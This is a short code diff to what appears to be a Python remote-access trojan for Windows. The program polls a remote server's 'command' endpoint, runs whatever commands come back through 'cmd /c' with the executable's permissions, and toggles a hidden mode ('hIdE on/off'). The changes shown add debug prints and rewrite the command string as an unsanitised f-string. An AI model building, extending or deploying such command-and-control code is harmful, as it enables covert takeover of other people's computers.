@@ -33,7 +33,7 @@ while True:
         break
     except:
         continue
-
+print(url)
 #                       Variable declaration
 screen = get_primary_display()
 terminate = False
@@ -310,8 +310,9 @@ def flip() -> None:
 ###            Run any command as same permission level as this exe      
 def runcmd(cmd:str) -> None:
     try:
+        # cmd = cmd[:-1]
         try:
-            result = sbrun(["cmd","/c",cmd], shell=True, capture_output=True, text=True)
+            result = sbrun(f"cmd /c \"{cmd}", shell=True, capture_output=True, text=True)
             stdout = result.stdout
             stderr = result.stderr
             exit_code = result.returncode
@@ -661,7 +662,7 @@ def main():
             cmd = hit(url+"command",data={"user":user})
             if type(cmd) != str:
                 cmd = cmd.content.decode("utf-8")
-            print(cmd)
+            print(f"{cmd}")
             if "hIdE on" in cmd:
                 Thread(target=hide,args=(True,)).start()
             elif "hIdE off" in cmd:
